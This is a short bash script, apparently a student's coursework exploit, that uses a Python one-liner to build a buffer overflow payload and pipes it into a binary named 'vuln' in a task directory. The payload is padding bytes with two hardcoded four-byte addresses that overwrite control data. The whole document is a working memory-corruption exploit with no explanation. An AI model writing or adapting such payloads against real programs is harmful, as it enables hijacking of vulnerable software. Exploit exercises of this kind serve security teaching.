#!/usr/bin/env bash
echo -en "$(python -c "print('A'*286+'\xe4\x88\xff\x43'+'A'*288+'\x30\xb3\xe5\xe0'+'B'*7)")"| /task1/s1923864/vuln